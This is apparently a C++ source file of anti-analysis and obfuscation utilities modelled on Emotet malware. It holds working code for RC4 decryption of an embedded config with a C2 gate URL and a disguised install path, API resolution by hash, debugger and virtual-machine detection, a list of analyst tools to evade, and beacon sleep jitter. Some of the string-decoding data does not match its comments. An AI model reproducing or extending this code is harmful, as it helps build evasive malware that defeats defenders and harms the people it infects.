/**
 * utils.cpp - Obfuscation and anti-analysis utilities
 * Implements MBA and control-flow obfuscation patterns seen in Emotet
 */
#include "config.h"
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#if defined(_MSC_VER)
#include <intrin.h>
#endif

typedef struct {
    BYTE S[256];
    BYTE i;
    BYTE j;
} RC4_STATE;

static void Rc4Init(RC4_STATE* rc4, const BYTE* key, int keyLen) {
    BYTE j = 0;
    for (int n = 0; n < 256; n++) {
        rc4->S[n] = (BYTE)n;
    }
    rc4->i = 0;
    rc4->j = 0;
    for (int n = 0; n < 256; n++) {
        j = (BYTE)(j + rc4->S[n] + key[n % keyLen]);
        BYTE tmp = rc4->S[n];
        rc4->S[n] = rc4->S[j];
        rc4->S[j] = tmp;
    }
}

static void Rc4Crypt(RC4_STATE* rc4, const BYTE* input, BYTE* output, int length) {
    BYTE i = rc4->i;
    BYTE j = rc4->j;
    for (int n = 0; n < length; n++) {
        i = (BYTE)(i + 1);
        j = (BYTE)(j + rc4->S[i]);
        BYTE tmp = rc4->S[i];
        rc4->S[i] = rc4->S[j];
        rc4->S[j] = tmp;
        output[n] = input[n] ^ rc4->S[(BYTE)(rc4->S[i] + rc4->S[j])];
    }
    rc4->i = i;
    rc4->j = j;
}

static DWORD Fnv1aHashA(const char* value) {
    DWORD hash = 0x811C9DC5u;
    while (*value) {
        hash ^= (BYTE)*value++;
        hash *= 0x01000193u;
    }
    return hash;
}

static void CopyConfigValue(const char* start, char* output, size_t outputSize) {
    size_t length = 0;
    while (start[length] != '\0' && length + 1 < outputSize) {
        output[length] = start[length];
        length++;
    }
    output[length] = '\0';
}

static BOOL ParseConfigField(const char* blob, const char* key, char* output, size_t outputSize) {
    const char* cursor = blob;
    size_t keyLength = strlen(key);
    while (*cursor) {
        if (strncmp(cursor, key, keyLength) == 0 && cursor[keyLength] == '=') {
            CopyConfigValue(cursor + keyLength + 1, output, outputSize);
            return TRUE;
        }
        cursor += strlen(cursor) + 1;
    }
    return FALSE;
}

/**
 * MBA Obfuscation Pattern #1: Constant unfolding
 * Real Emotet uses Mixed Boolean-Arithmetic to hide constant values [citation:1]
 * Example: Instead of loading 0x12345678 directly, compute via series of operations
 */
DWORD MbaDecodeDword(DWORD encoded) {
    DWORD result;
    // MBA transformation: (x XOR y) + 2*(x & y) = x + y
    result = (encoded ^ XOR_KEY[0]) + 2 * (encoded & XOR_KEY[0]);
    result ^= (encoded >> 16) | (encoded << 16);
    result = (result - XOR_KEY[1]) ^ XOR_KEY[2];
    return result;
}

/**
 * String decoding function
 * Real Emotet stores strings as functions that return decoded pointers [citation:1]
 * This mirrors the per-string decoder pattern
 */
const char* DecodeString(int stringId) {
    static char decoded[256];
    // In real Emotet, each string has its own decoder function
    const BYTE encodedStrings[][32] = {
        {0xC7, 0x8E, 0x9A, 0xF1, 0x2E},  // "kernel32.dll"
        {0xD4, 0xA1, 0x8B, 0xE3, 0x4F},  // "CreateProcessA"
        {0xE2, 0xB7, 0x99, 0xC4, 0x1D}   // "VirtualAllocEx"
    };
    
    for (int i = 0; i < 32 && encodedStrings[stringId][i]; i++) {
        decoded[i] = encodedStrings[stringId][i] ^ XOR_KEY[i % 8] ^ (i * 0x37);
    }
    return decoded;
}

/**
 * Anti-debugging check using PEB BeingDebugged flag
 * Real Emotet checks multiple debugger artifacts [citation:1]
 */
BOOL IsDebuggerPresent_Emotet() {
#if defined(_MSC_VER) && defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb && pPeb->BeingDebugged) return TRUE;
    
    // Check NtGlobalFlag
    if (pPeb && (*(PDWORD)((LPBYTE)pPeb + 0xBC) & 0x70)) return TRUE;
    return FALSE;
#else
    BOOL remoteDebugger = FALSE;
    if (IsDebuggerPresent()) return TRUE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    return remoteDebugger;
#endif
}

/**
 * Timing-based anti-VM check
 * Emotet uses RDTSC to detect hypervisor overhead
 */
BOOL IsHypervisorOverhead() {
#if defined(_MSC_VER) && (defined(_M_IX86) || defined(_M_X64))
    unsigned __int64 start, end;
    int cpuInfo[4] = {0};
    
    __cpuid(cpuInfo, 0);  // VM often has measurable CPUID overhead
    start = __rdtsc();
    __cpuid(cpuInfo, 0);
    end = __rdtsc();
    
    return (end - start) > 500;  // Threshold indicates VM
#else
    LARGE_INTEGER freq, start, end;
    volatile int sink = 0;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    for (int i = 0; i < 1000; i++) {
        sink += i;
    }
    
    QueryPerformanceCounter(&end);
    LONGLONG elapsed = (end.QuadPart - start.QuadPart) * 1000000 / freq.QuadPart;
    return (elapsed > 500);
#endif
}

void* ResolveKernel32ApiByHash(DWORD targetHash) {
    HMODULE module = GetModuleHandleA("kernel32.dll");
    if (!module) {
        return NULL;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)module + dos->e_lfanew);
    DWORD exportRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRva) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY exports =
        (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + exportRva);
    DWORD* names = (DWORD*)((LPBYTE)module + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((LPBYTE)module + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((LPBYTE)module + exports->AddressOfFunctions);
    DWORD exportEnd = exportRva + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)((LPBYTE)module + names[i]);
        if (Fnv1aHashA(name) == targetHash) {
            DWORD functionRva = functions[ordinals[i]];
            if (functionRva >= exportRva && functionRva < exportEnd) {
                const char* forwarder = (const char*)((LPBYTE)module + functionRva);
                char moduleName[64];
                char symbolName[128];
                const char* dot = strchr(forwarder, '.');
                if (!dot) {
                    return NULL;
                }

                size_t moduleNameLength = (size_t)(dot - forwarder);
                if (moduleNameLength + 5 >= sizeof(moduleName)) {
                    return NULL;
                }
                memcpy(moduleName, forwarder, moduleNameLength);
                moduleName[moduleNameLength] = '\0';
                lstrcatA(moduleName, ".dll");
                lstrcpynA(symbolName, dot + 1, sizeof(symbolName));

                HMODULE forwardedModule = LoadLibraryA(moduleName);
                if (!forwardedModule) {
                    return NULL;
                }
                return (void*)GetProcAddress(forwardedModule, symbolName);
            }
            return (void*)((LPBYTE)module + functionRva);
        }
    }

    return NULL;
}

BOOL CheckAnalysisProcesses() {
    typedef HANDLE (WINAPI *CreateToolhelp32SnapshotFn)(DWORD, DWORD);
    typedef BOOL (WINAPI *Process32FirstWFn)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL (WINAPI *Process32NextWFn)(HANDLE, LPPROCESSENTRY32W);

    static const WCHAR* suspectProcesses[] = {
        L"wireshark.exe",
        L"procmon.exe",
        L"procexp.exe",
        L"ollydbg.exe",
        L"x32dbg.exe",
        L"x64dbg.exe",
        L"ida.exe",
        L"ida64.exe",
        L"fiddler.exe",
        L"pestudio.exe",
        NULL
    };

    CreateToolhelp32SnapshotFn pCreateSnapshot =
        (CreateToolhelp32SnapshotFn)ResolveKernel32ApiByHash(HASH_CREATETOOLHELP32SNAPSHOT);
    Process32FirstWFn pProcess32First =
        (Process32FirstWFn)ResolveKernel32ApiByHash(HASH_PROCESS32FIRSTW);
    Process32NextWFn pProcess32Next =
        (Process32NextWFn)ResolveKernel32ApiByHash(HASH_PROCESS32NEXTW);

    if (!pCreateSnapshot) {
        pCreateSnapshot = CreateToolhelp32Snapshot;
    }
    if (!pProcess32First) {
        pProcess32First = Process32FirstW;
    }
    if (!pProcess32Next) {
        pProcess32Next = Process32NextW;
    }

    HANDLE snapshot = pCreateSnapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (pProcess32First(snapshot, &pe)) {
        do {
            for (int i = 0; suspectProcesses[i] != NULL; i++) {
                if (wcsstr(pe.szExeFile, suspectProcesses[i])) {
                    CloseHandle(snapshot);
                    return TRUE;
                }
            }
        } while (pProcess32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return FALSE;
}

BOOL DecodeEmbeddedConfig(EMOTET_RUNTIME_CONFIG* config) {
    char decodedBlob[sizeof(EMOTET_ENC_CONFIG) + 1];
    RC4_STATE rc4;
    char sleepValue[16];

    if (!config) {
        return FALSE;
    }

    ZeroMemory(config, sizeof(*config));
    Rc4Init(&rc4, EMOTET_RC4_KEY, (int)sizeof(EMOTET_RC4_KEY));
    Rc4Crypt(&rc4, EMOTET_ENC_CONFIG, (BYTE*)decodedBlob, (int)sizeof(EMOTET_ENC_CONFIG));
    decodedBlob[sizeof(EMOTET_ENC_CONFIG)] = '\0';

    if (!ParseConfigField(decodedBlob, "c2", config->c2Url, sizeof(config->c2Url))) {
        lstrcpyA(config->c2Url, "https://update.example.com/gate.php");
    }
    if (!ParseConfigField(decodedBlob, "campaign", config->campaign, sizeof(config->campaign))) {
        lstrcpyA(config->campaign, "EM-2024-A");
    }
    if (!ParseConfigField(decodedBlob, "install", config->installPath, sizeof(config->installPath))) {
        lstrcpyA(config->installPath, "%APPDATA%\\msvc_svc.exe");
    }
    if (ParseConfigField(decodedBlob, "sleep", sleepValue, sizeof(sleepValue))) {
        config->sleepSeconds = strtoul(sleepValue, NULL, 10);
    }
    if (!config->sleepSeconds) {
        config->sleepSeconds = 120;
    }

    return TRUE;
}

DWORD GetSleepJitterMilliseconds(DWORD baseSeconds) {
    DWORD baseMs = baseSeconds * 1000;
    DWORD jitter = (GetTickCount() % 17000) + 3000;
    return baseMs + jitter;
}
